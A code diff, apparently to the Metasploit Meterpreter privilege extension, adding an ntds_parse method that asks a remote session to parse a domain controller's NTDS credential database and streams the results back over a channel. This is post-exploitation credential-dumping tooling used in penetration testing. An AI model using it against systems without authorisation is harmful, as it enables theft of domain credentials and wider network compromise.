@@ -95,6 +95,17 @@ class Priv < Extension
     }
   end
 
+  def ntds_parse(filepath)
+    request = Packet.create_request( 'priv_ntds_parse' )
+    request.add_tlv( TLV_TYPE_NTDS_PATH, filepath)
+    response = client.send_request( request, 90 )
+    channel_id = response.get_tlv_value(TLV_TYPE_CHANNEL_ID)
+    if channel_id.nil?
+      raise Exception, "We did not get a channel back!"
+    end
+    channel = Rex::Post::Meterpreter::Channels::Pools::StreamPool.new(client, channel_id, "priv_ntds", CHANNEL_FLAG_SYNCHRONOUS)
+  end
+
   #
   # Modifying privileged file system attributes.
   #
